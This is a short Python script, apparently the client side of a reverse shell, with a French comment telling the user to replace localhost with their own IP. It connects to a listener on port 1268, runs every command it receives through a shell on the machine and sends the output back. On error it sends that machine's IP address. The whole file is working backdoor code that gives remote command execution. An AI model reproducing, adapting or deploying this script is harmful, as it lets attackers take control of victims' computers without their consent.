import socket
import os
import sys
import subprocess
import base64

host_name = os.getlogin()
ip = socket.gethostbyname(host_name)
HOST = socket._LOCALHOST  # non-local => changer socket._LOCALHOST en votre ip 
PORT = 1268

filename = "data_socket1.txt"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect((HOST, PORT)) 

print("connected")

while True:
    data = server.recv(1024).decode("utf-8")

    if len(data) > 0:
        try:
            with open(os.path.join(os.environ['USERPROFILE'], filename), "w") as f:
                proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                out, err = proc.communicate()
                server.send(out)
        except Exception as e:
            print("error", e)
            server.send(f"Client Error : {ip} => {e}".encode())
            sys.exit()




